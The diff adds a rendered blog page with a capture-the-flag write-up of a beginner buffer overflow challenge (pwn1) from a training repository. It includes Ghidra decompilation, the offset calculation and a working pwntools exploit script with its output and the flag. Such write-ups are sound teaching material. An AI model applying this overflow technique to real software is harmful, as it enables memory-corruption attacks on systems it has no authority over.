@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en-US" data-theme="light">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<title>Overflow challenge #1 - Ephesus - Minimalist Jekyll Theme</title>
+		<meta name="description" content="Ephesus - Minimalist Jekyll Theme">
+		<meta name="keywords" content="">
+		<base href="http://localhost:4000" />
+		
+    	<meta content="2023-11-10T00:00:00-05:00" property="article:published_time">
+    	<meta content="http://localhost:4000/about/" property="article:author">
+  		
+		<meta property="og:site_name" content="Ephesus - Minimalist Jekyll Theme">
+		<meta property="og:type" content="article" />
+		<meta property="og:url" content="http://localhost:4000/overflow-challenge-1"/>
+		<meta property="og:title" content="Overflow challenge #1 - Ephesus - Minimalist Jekyll Theme" />
+		<meta property="og:description" content="Ephesus - Minimalist Jekyll Theme" />
+		<meta property="og:image" content="http://localhost:4000/assets/images/favicon.png"/>
+		<meta name="twitter:card" content="summary"/>
+		<meta property="twitter:title" content="Overflow challenge #1 - Ephesus - Minimalist Jekyll Theme" />
+		<meta property="twitter:description" content="Ephesus - Minimalist Jekyll Theme" />
+		<meta property="twitter:image" content="http://localhost:4000/assets/images/favicon.png" />
+		<link rel="stylesheet" href="assets/css/highlight.css">
+		<link rel="stylesheet" href="assets/css/style.css">
+		<link rel="shortcut icon" href="assets/images/favicon.png" />
+		<link rel="alternate" type="application/atom+xml" title="Ephesus - Minimalist Jekyll Theme" href="http://localhost:4000/atom.xml">
+		<link rel="alternate" type="application/json" title="Ephesus - Minimalist Jekyll Theme" href="http://localhost:4000/feed.json" />
+		<link rel="sitemap" type="application/xml" title="sitemap" href="http://localhost:4000/sitemap.xml" />
+		<meta name="google-site-verification" content="XXX" />
+	</head>
+<body>
+<div class="container">
+	<div class="profile">
+		<a href="http://localhost:4000"><img src="assets/images/profile.jpg" class="profile-image"></a>
+		<div class="profile-about">
+			<h2 style="margin-bottom: 0; font-weight: 700;">Zachary Reed</h2>
+			
+			
+			
+			
+			
+				<a href="https://github.com/BUG5Y" target="_blank"><img src="assets/images/icon/github.svg" class="social-icon"></a>
+			
+			
+				<a href="https://linkedin.com/in/hakantorun" target="_blank"><img src="assets/images/icon/linkedin.svg" class="social-icon"></a>
+			
+			<a href="about"><img src="assets/images/icon/me.svg" class="social-icon"></a>
+			<br>
+			Fill <br> Fill <br> OSCP ~ eJPT ~ Security+ /#linux
+			<br>
+			<div class="mode" id="mode-switcher" onclick="toggleNightMode();">
+				<span></span>
+			</div>
+		</div>
+	</div>
+	
+<div class="post-header">
+	<div class="post-date">10.11.2023</div>
+	<div class="post-share">
+		Share:&nbsp; 
+		<a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/Overflow Challenge #1" target="_blank"><img src="assets/images/icon/facebook.svg" class="social-icon"></a>
+		<a href="https://twitter.com/intent/tweet?source=tweetbutton&amp;original_referer=http://localhost:4000/Overflow Challenge #1&amp;text=Overflow challenge #1 - http://localhost:4000/Overflow Challenge #1" target="_blank"><img src="assets/images/icon/twitter.svg" class="social-icon"></a>
+		<a href="https://api.whatsapp.com/send?text=http://localhost:4000/Overflow Challenge #1" target="_blank"><img src="assets/images/icon/whatsapp.svg" class="social-icon"></a>
+	</div>
+</div>
+
+<div class="blog-post-content">
+	<h1>Overflow challenge #1</h1>
+	<p>This is a short write-up of Challenge #1 a variable overflow from <a href="https://github.com/hoppersroppers/nightmare/tree/master/modules/04-Overflows">hoppersroppers nightmare repository</a>.</p>
+
+<p>First things first lets find out what we are working with.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">checksec</span> <span class="nx">pwn1</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="dl">'</span><span class="s1">/home/user/nightmare/pwn1</span><span class="dl">'</span>
+    <span class="nx">Arch</span><span class="p">:</span>     <span class="nx">i386</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="nx">little</span>
+    <span class="nx">RELRO</span><span class="p">:</span>    <span class="nx">Full</span> <span class="nx">RELRO</span>
+    <span class="nx">Stack</span><span class="p">:</span>    <span class="nx">No</span> <span class="nx">canary</span> <span class="nx">found</span>
+    <span class="nx">NX</span><span class="p">:</span>       <span class="nx">NX</span> <span class="nx">enabled</span>
+    <span class="nx">PIE</span><span class="p">:</span>      <span class="nx">PIE</span> <span class="nx">enabled</span>
+</code></pre></div></div>
+
+<p>pwn1 is a <code class="language-plaintext highlighter-rouge">32</code> bit little endian binary with RELRO, a Non-Executable Stack, and PIE. We also can verify that we can run this binary but it exits as it seems to not like our answer to the question asked.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="o">/</span><span class="nx">pwn1</span>
+<span class="nx">Stop</span><span class="o">!</span> <span class="nx">Who</span> <span class="nx">would</span> <span class="nx">cross</span> <span class="nx">the</span> <span class="nx">Bridge</span> <span class="k">of</span> <span class="nx">Death</span> <span class="nx">must</span> <span class="nx">answer</span> <span class="nx">me</span> <span class="nx">these</span> <span class="nx">questions</span> <span class="nx">three</span><span class="p">,</span> <span class="nx">ere</span> <span class="nx">the</span> <span class="nx">other</span> <span class="nx">side</span> <span class="nx">he</span> <span class="nx">see</span><span class="p">.</span>
+<span class="nx">What</span><span class="p">...</span> <span class="nx">is</span> <span class="nx">your</span> <span class="nx">name</span><span class="p">?</span>
+<span class="nx">bugsy</span>
+<span class="nx">I</span> <span class="nx">don</span><span class="dl">'</span><span class="s1">t know that! Auuuuuuuugh!
+</span></code></pre></div></div>
+
+<p>Within Ghidra we can locate an exported function <code class="language-plaintext highlighter-rouge">main</code>. <code class="language-plaintext highlighter-rouge">main</code> has 3 main parts question 1, 2, and 3.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>
+<span class="cm">/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */</span>
+
+<span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="n">undefined</span> <span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">userVar</span> <span class="p">[</span><span class="mi">43</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_18</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_14</span><span class="p">;</span>
+  <span class="n">undefined1</span> <span class="o">*</span><span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">param_1</span><span class="p">;</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">puts</span><span class="p">(</span>
+      <span class="s">"Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see."</span>
+      <span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"What... is your name?"</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">userVar</span><span class="p">,</span><span class="mh">0x2b</span><span class="p">,</span><span class="n">_stdin</span><span class="p">);</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">userVar</span><span class="p">,</span><span class="s">"Sir Lancelot of Camelot</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"I don</span><span class="se">\'</span><span class="s">t know that! Auuuuuuuugh!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"What... is your quest?"</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">userVar</span><span class="p">,</span><span class="mh">0x2b</span><span class="p">,</span><span class="n">_stdin</span><span class="p">);</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">userVar</span><span class="p">,</span><span class="s">"To seek the Holy Grail.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"I don</span><span class="se">\'</span><span class="s">t know that! Auuuuuuuugh!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"What... is my secret?"</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">userVar</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_18</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x215eef38</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">print_flag</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"I don</span><span class="se">\'</span><span class="s">t know that! Auuuuuuuugh!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Question 1: “What… is your name?”</p>
+
+<p>This uses <code class="language-plaintext highlighter-rouge">fgets()</code> to safely retrieve <code class="language-plaintext highlighter-rouge">userVar</code> verify that it is within the bounds of the allocated array. It is then compared it to a hard coded string, <code class="language-plaintext highlighter-rouge">"Sir Lancelot of Camelot\n"</code>. If it is is equal we continue to the next question.</p>
+
+<p>Question 2: “What… is your quest?”</p>
+
+<p>Once again using <code class="language-plaintext highlighter-rouge">fgets()</code> to retrieve <code class="language-plaintext highlighter-rouge">userVar</code>, <code class="language-plaintext highlighter-rouge">userVar</code> is then compared to another hard-coded string, <code class="language-plaintext highlighter-rouge">"To seek the Holy Grail.\n"</code>. If it is equal then we continue to the third question.</p>
+
+<p>Question 3: “What… is my secret?”</p>
+
+<p>This time <code class="language-plaintext highlighter-rouge">gets()</code> is used to retrieve <code class="language-plaintext highlighter-rouge">userVar</code>. Meaning that the bounds of the array are not verified and there does not appear to be any other type of safety checks. Additionally <code class="language-plaintext highlighter-rouge">userVar</code> is not being compared this time. This time <code class="language-plaintext highlighter-rouge">local_18</code> is compared to <code class="language-plaintext highlighter-rouge">-0x215eef38</code> instead of a hard-coded string and if it is equal then <code class="language-plaintext highlighter-rouge">print_flag()</code> is called. However, <code class="language-plaintext highlighter-rouge">local_18</code> is set to equal 0 so in order for the two to be equal we will need to overwrite the value of <code class="language-plaintext highlighter-rouge">local_18</code>.</p>
+
+<p>Thanks to Ghidra we can view the assembly instructions of the function. This shows us that <code class="language-plaintext highlighter-rouge">userVar</code> starts at <code class="language-plaintext highlighter-rouge">-0x43</code> and <code class="language-plaintext highlighter-rouge">local_18</code> starts at <code class="language-plaintext highlighter-rouge">-0x18</code>.</p>
+
+<ol>
+  <li>Offset=0x43−0x18</li>
+  <li>Offset=0x2B</li>
+</ol>
+
+<p><img src="Overflow%20Challenge%20#1%200dcf7e07e2974561ae2c6c519db471de/pwn1.png" alt="pwn1.png" /></p>
+
+<p>Viewing the assembly for <code class="language-plaintext highlighter-rouge">if (local_18 == -0x215eef38)</code> we see that local_18 is being compared to <code class="language-plaintext highlighter-rouge">0xdea110c8</code>.</p>
+
+<p><img src="Overflow%20Challenge%20#1%200dcf7e07e2974561ae2c6c519db471de/pwn2.png" alt="pwn2.png" /></p>
+
+<p>Armed with this knowledge we know we need to overwrite <code class="language-plaintext highlighter-rouge">0x2B</code> (43 bytes) prior to overwriting local_18 with the value that we want it to be, in this case <code class="language-plaintext highlighter-rouge">0xdea110c8</code>.</p>
+
+<p>Hacking a Python script together I ended up with the following:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">'</span><span class="s">./pwn1</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x2b</span>
+<span class="n">comparedVal</span> <span class="o">=</span> <span class="mh">0xdea110c8</span>
+<span class="n">newLine</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="n">junk</span><span class="p">,</span>
+    <span class="nf">p32</span><span class="p">(</span><span class="n">comparedVal</span><span class="p">),</span>
+    <span class="n">newLine</span>
+<span class="p">]</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span>
+<span class="c1"># Question 1
+</span><span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Sir Lancelot of Camelot</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="c1"># Question 2
+</span><span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">To seek the Holy Grail.</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Question 3
+</span><span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Sending payload....</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>And we got the flag!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="p">.</span><span class="o">/</span><span class="n">pwn1</span><span class="p">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">local</span> <span class="n">process</span> <span class="sh">'</span><span class="s">/home/user/nightmare/pwn1</span><span class="sh">'</span><span class="p">:</span> <span class="n">pid</span> <span class="mi">7811</span>
+<span class="sa">b</span><span class="sh">'</span><span class="s">Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.</span><span class="se">\n</span><span class="sh">'</span>
+<span class="sa">b</span><span class="sh">'</span><span class="s">What... is your name?</span><span class="se">\n</span><span class="sh">'</span>
+<span class="sa">b</span><span class="sh">'</span><span class="s">What... is your quest?</span><span class="se">\n</span><span class="sh">'</span>
+<span class="sa">b</span><span class="sh">'</span><span class="s">What... is my secret?</span><span class="se">\n</span><span class="sh">'</span>
+<span class="n">Sending</span> <span class="n">payload</span><span class="p">.</span><span class="bp">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Process</span> <span class="sh">'</span><span class="s">/home/user/nightmare/pwn1</span><span class="sh">'</span> <span class="n">stopped</span> <span class="k">with</span> <span class="nb">exit</span> <span class="n">code</span> <span class="mi">0</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">7811</span><span class="p">)</span>
+<span class="sa">b</span><span class="sh">'</span><span class="s">Right. Off you go.</span><span class="se">\n</span><span class="sh">'</span>
+<span class="sa">b</span><span class="sh">'</span><span class="s">flag{g0ttem_b0yz}</span><span class="se">\n</span><span class="sh">'</span>
+</code></pre></div></div>
+
+</div>
+<div class="tags-container">
+	
+</div>
+<div class="navigation">
+	
+		<a class="prev" href="/injured-android">< Injured android</a>
+	 
+</div>
+
+	<section class="comment-area w-100">
+		<div class="comment-wrapper">
+			<div id="disqus_thread" class="article-comments"></div>
+			<script>
+			(function() {
+			var d = document, s = d.createElement('script');
+			s.src = '//XXX.disqus.com/embed.js';
+			s.setAttribute('data-timestamp', +new Date());
+			(d.head || d.body).appendChild(s);
+			})();
+			</script>
+			<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+		</div>
+	</section>
+
+	<div class="footer">
+		<span>Made with <font color="red">♥</font> on Earth, a minimalist Jekyll Theme by <a href="https://hakan.io"><b>Hakan</b></a></span>
+	</div>
+</div>
+	<script src="assets/js/ephesus.js"></script>
+	<script type="text/javascript">
+		if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+			document.documentElement.setAttribute('data-theme', 'dark');
+			document.getElementById('mode-switcher').classList.add('active');
+		}
+	</script>
+
+	
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-XXXXXXXX-00"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-XXXXXXXX-00');
+    </script>
+	
+</body>
+</html>
